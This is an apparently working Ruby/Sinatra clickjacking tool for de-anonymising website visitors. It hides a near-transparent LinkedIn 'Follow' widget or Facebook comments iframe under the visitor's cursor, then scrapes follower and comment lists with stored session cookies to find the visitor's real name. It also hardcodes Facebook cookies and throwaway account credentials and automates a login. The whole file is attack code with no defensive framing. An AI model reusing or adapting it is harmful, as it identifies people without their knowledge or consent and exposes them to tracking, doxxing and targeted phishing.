require 'faraday'
require 'json'
require 'securerandom'

get '/ping' do

  id = params[:id].to_i
  users = []

  case params[:system]
  when 'linkedin'

    conn = Faraday.new(:url => 'https://www.linkedin.com')
    resp = conn.get do |r|
      r.url "/company/#{id}/followers?page_num=1"

      r.headers['Cookie'] =<<COOKIE
linkedincookies
COOKIE

      r.options.timeout = 4        
      r.options.open_timeout = 2
    end.body


    resp.gsub /<div class="vcard">\s*<p class="fn n">(.*?)<\/p>\s*<p class="title">(.*?)<\/p>\s*<p class="location">(.*?)<\/p>\s*<\/div>/m do |m|
      users.push($1)
    end

  when 'facebook'

    conn = Faraday.new(:url => 'https://www.facebook.com')
    resp = conn.get do |r|
      r.url "/browse/likes?id=#{id}"

      r.headers['Cookie'] = get_fb_cookies

      r.options.timeout = 4        
      r.options.open_timeout = 2
    end.body


    resp.gsub /<div class="fsl fwb fcb">(.*?)<\/div>/m do |m|
      users.push($1)
    end
  end

  JSON.dump users
end

get '/detector' do
  case system = params[:system]

  when 'linkedin'
  ids = [3787308,3787307,3787306,3787305,3787304,3787303,3787302,3787301,3787300,3787299,3787298,3787297,3787295,3787294,3787293,3787292,3787291,3787290,3787289,3787288,3787287,3787286,3787285,3787284,3787283,3787282,3787281,3787280,3787279,3787278,3787277,3787276,3787275,3787274,3787273,3787272,3787271,3787270,3787269,3787268,3787267,3787266,3787265,3787264,3787263,3787262,3787261,3787260,3787259,3787258,3787257,3787256,3787255,3787254,3787253,3787252,3787251,3787250,3787249,3787248,3787247,3787246,3787245,3787244,3787243,3787242,3787241,3787240,3787239,3787238,3787237,3787236,3787235,3787234,3787233,3787232,3787231,3787230,3787229,3787228,3787227,3787226,3787225,3787224,3787223,3787222,3787221,3787220,3787219,3787218,3787217,3787216,3787215,3787214,3787213,3787212,3787211,3787210,3787209]
  id = ids[rand(ids.size)]
  payload =<<PAYLOAD
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' 'unsafe-eval' http://platform.linkedin.com/in.js  https://platform.linkedin.com/js/secureAnonymousFramework https://www.linkedin.com/inbox/">


<div id=inj>
<a href="https://www.linkedin.com/company/#{id}">Bait-company, make sure you don't follow it</a>. Please click here: 
<script src="http://platform.linkedin.com/in.js" type="text/javascript">
  lang: en_US
</script>
<script type="IN/FollowCompany" data-id="#{id}" data-counter="right"></script>
</div>
<script src="https://www.linkedin.com/inbox/" onload="" onerror="$('#inj').html('you are not logged in')"></script>

PAYLOAD


  when 'facebook'

    conn = Faraday.new(:url => 'https://www.facebook.com')


    hash = SecureRandom.hex
    url = URI.encode("http://www.google.com?#{hash}")
   # url = URI.encode 'https://www.google.com/?15b5e5df947682d398e5c8dadfadeabc'
    3.times{|time|

      resp = conn.post do |r|
        r.url '/ajax/connect/feedback.php'

        r.headers['Cookie'] = get_fb_cookies

        r.body = "fb_dtsg=#{DATA[:fb_dtsg]}&url=#{url}&uniqid=u_0_0&target=#{url}&colorscheme=light&controller_id=feedback_0FukBkzxApodf4mUM&locale=en_US&command=comment&normalize_grammar=0&iframe_referer=&text_text=text&text=text&commentas=100000640083243&__user=100000640083243&__a=1&__dyn=7wci2e4oK4osXWo4C&__req=2&ttstamp=2658171826510750481149710885&__rev=1319421"


        r.options.timeout = 4        
        r.options.open_timeout = 2
      end.body

      if resp[/fbc_[0-9]+_[0-9]+_([0-9]+)/]
        id = $1
        break
      else
        raise 'not working' if time == 2
        puts 'updating...'
        update_fb_cookies
      end
    }

    payload =<<PAYLOAD
<iframe width="600" height="520"  src="https://www.facebook.com/plugins/comments.php?href=#{url}&locale=en_US&numposts=100"></iframe>
PAYLOAD

  else
    raise 'Not found'
  end


  html =<<HTML
<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
#{payload}

<div id="users"></div>

<div style="width:100%;height:100%;left:-30px;top:-30px;position:absolute;opacity:0;" onclick="this.style.display='none';li.style.opacity='1';"></div>

<script>
id = '#{id}'
ping_url = '/ping?system=#{system}&id='+id
pinged = 0
$.get(ping_url,function(result){
  init_users = JSON.parse(result)
})


/*

setInterval(function(){
  li.style.opacity='0.1'
  },5)
setInterval(function(){
  li.style.opacity='1'
  },5)
*/

function hide(){
  li = document.getElementsByTagName('iframe')[0];
  if(li.style.position!='absolute'){

//  li.style.opacity='0.1'
  li.style.opacity='0.01'

  li.style.left='-110px'
  li.style.top='-133px'
  li.style.position='absolute'    
  }
}

init = function(){
  if(document.getElementsByTagName('iframe').length == 0){
    setTimeout(init, 1000);
    return false;
  }
 
  //$(li).parent()[0].style.backgroundColor='383'
  checker = function(){

    pinged += 1
    if(pinged > 20){
      clearTimeout(checker);
      return false;
    }
    $.get(ping_url,function(got){
      new_users = JSON.parse(got)
      not_found = true
      
      for(i in new_users){
        el = new_users[i];
        if(init_users.indexOf(el) == -1){
          not_found = false
          console.log('found', el)
          li.style.display='none'
          parent.postMessage(el,'*')
          $('#users').html("Hello, "+el)
          //$(li).hide()
          break;
        }

      }

      if(not_found) setTimeout(checker,600)
    })

  }
  setTimeout(checker,1000)
}
setInterval(hide,100)

$(init)

</script>
HTML



end

DATA = {
  fb_dtsg: '',
  fb_cookie: '',
  fb_default_cookie: 'locale=en_US; datr=n4wEVJFDZb_wOVYo5JPjA_5g; fr=0bu07hBxmHQcJRR6c.AWViSibWQx7mv6gDWQKnlPHNl-c.BUBIyk.pj.AAA.0.AWW1S1T4; x-referer=%2Fhome.php%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252F%26soft%3Dmore%23%2Fhome.php%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252F%26soft%3Dnotifications; lu=RApwQsnBA1JEQORCkO1OWxSg; reg_fb_gate=https%3A%2F%2Fm.facebook.com%2F%3Fstype%3Dlo%26jlou%3DAfcSAC-oZkEf3d57lCvlqOQVWuLOihcr30M_UT2wOQeilkQhBe_6ntLVk_AX8f5GY_h1z0sLB1UnKw6eswZYCQJjtILo2A0SRpBhdF6v71yMvA%26smuh%3D34444%26lh%3DAc8EIIW5EUAuUVw9%26refid%3D7; reg_fb_ref=https%3A%2F%2Fm.facebook.com%2F; m_ts=1409596567'
}


def get_fb_cookies
  "#{DATA[:fb_default_cookie]};#{DATA[:fb_cookie]}"
end




def update_fb_cookies

  #require 'faraday-cookie_jar'


  conn = Faraday.new(:url => 'https://www.facebook.com') do |builder|
    #builder.use :cookie_jar
    builder.adapter Faraday.default_adapter
  end



  resp = conn.get '/login.php'
  DATA[:fb_default_cookie] = resp.headers['set-cookie'].match(/datr=.*?;/).to_s
 
  resp.body.match /lsd" value="(.*?)"/
  lsd = $1


  puts lsd, DATA[:fb_default_cookie]
  resp = conn.post do |r|

    r.url '/login.php'

    r.headers['Cookie'] = DATA[:fb_default_cookie]
    email=URI.encode 'olol123123@mailtothis.com'
    pass = '123123qwe'
    r.body = "lsd=#{lsd}&version=1&ajax=0&width=0&pxr=0&gps=0&m_ts=1409596567&trynum=1&spw=0&email=#{email}&pass=#{pass}&login=Log+In"
 
    r.options.timeout = 4        
    r.options.open_timeout = 2
  end

  puts resp.headers #['set-cookie']

  DATA[:fb_cookie] = resp.headers['set-cookie'].gsub(',',';')

  resp = conn.get('/') do |r|
    
    r.headers['Cookie'] = get_fb_cookies

    r.options.timeout = 4        
    r.options.open_timeout = 2
  end

  resp.body.match(/fb_dtsg" value="(.*?)"/)
  DATA[:fb_dtsg] = $1

end




=begin
#gem install open_uri_redirections

require 'open_uri_redirections'
require 'open-uri'
id = 3787308
finish_id = id - 100
suits = []
while id > finish_id
  check = open("https://www.linkedin.com/company/#{id}", :allow_redirections => :all).read

  if check[/<strong>(.*?)<\/strong> <span/] 
    f = $1.to_i 
    if f >= 0 and f < 7
      suits.push id 
    end
  end
  id -= 1

end

puts suits.join(',')

=end